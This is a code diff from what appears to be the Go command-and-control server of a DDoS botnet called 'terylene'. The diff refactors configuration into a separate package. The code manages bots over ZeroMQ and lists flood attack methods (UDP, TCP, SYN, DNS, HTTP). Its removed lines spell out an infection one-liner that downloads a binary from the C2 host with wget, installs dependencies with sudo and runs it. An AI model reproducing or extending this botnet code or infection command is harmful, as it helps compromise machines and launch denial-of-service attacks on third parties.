@@ -9,10 +9,11 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
-	"time"
+	config "terylene/config"
 	dropper "terylene/server/components/dropper"
 	transfer "terylene/server/components/transfer"
 	poly "terylene/server/theme/default"
+	"time"
 
 	"github.com/fatih/color"
 	zmq "github.com/pebbe/zmq4"
@@ -24,19 +25,7 @@ type Botstruc struct {
 	localip string
 }
 
-const (
-	//config
-	C2ip          = "0.0.0.0"
-	routerport    = "5556" //router port
-	broadcastport = "5555" //broadcast port
-
-	infcommand = "wget -O file http://%s:8080/terylene && export DEBIAN_FRONTEND=noninteractive || true && apt-get install -y libzmq3-dev || true && yes | sudo pacman -S zeromq || true && sudo dnf -y install zeromq || true && chmod +x file && ./file"
-)
-
 var (
-	//config
-	blocked = []string{"google.com", "polysphere.cc", "youtube.com", ".gov", ".edu", "127.0.0.1"}
-
 	//WARNING: changing these values will crash the C2 (unless you know what you're doing !)
 	methods     = []string{"UDP", "TCP", "SYN", "DNS", "HTTP", "UDP-VIP"}
 	registered  = make(map[string]string)
@@ -100,7 +89,7 @@ func routerhandle(router *zmq.Socket) {
 					}
 					tera[msg[0]] = bot
 					registered[msg[0]] = "terylene"
-					router.SendMessage(msg[0], "terylene", broadcastport)
+					router.SendMessage(msg[0], "terylene", config.Broadcastport)
 				}
 			}
 		}
@@ -159,11 +148,11 @@ func main() {
 		os.Exit(1)
 	}
 
-	err = publisher.Bind(fmt.Sprintf("tcp://%s:%s", C2ip, broadcastport))
+	err = publisher.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Broadcastport))
 
 	if err != nil {
 		fmt.Println(err)
-		color.Red("[X] error binding port %s", broadcastport)
+		color.Red("[X] error binding port %s", config.Broadcastport)
 		os.Exit(1)
 	}
 	time.Sleep(50 * time.Millisecond)
@@ -180,11 +169,11 @@ func main() {
 	}
 	defer router.Close()
 
-	err = router.Bind(fmt.Sprintf("tcp://%s:%s", C2ip, routerport))
+	err = router.Bind(fmt.Sprintf("tcp://%s:%s", config.C2ip, config.Routerport))
 
 	if err != nil {
 		fmt.Println(err)
-		color.Red("[X] error binding port %s", broadcastport)
+		color.Red("[X] error binding port %s", config.Routerport)
 		os.Exit(1)
 	}
 	go heartbeatsend(router)
@@ -236,12 +225,12 @@ func main() {
 			}
 		case "payload":
 			fmt.Println("linux payload:")
-			if C2ip == "0.0.0.0" {
+			if config.C2ip == "0.0.0.0" {
 				newC2ip := getpubIp()
-				fmt.Println(fmt.Sprintf(infcommand, newC2ip))
+				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
 				continue
 			}
-			fmt.Println(fmt.Sprintf(infcommand, C2ip))
+			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
 		case "transfer":
 			if len(aliveclient) == 0 {
 				fmt.Println("you dont have any online bots sadly :(")
@@ -289,7 +278,7 @@ func main() {
 			containsBlocked := false
 			for _, value := range methods {
 				if strings.Contains(command, value) {
-					for _, block := range blocked {
+					for _, block := range config.Blocked {
 						if strings.Contains(command, block) {
 							containsBlocked = true
 						}
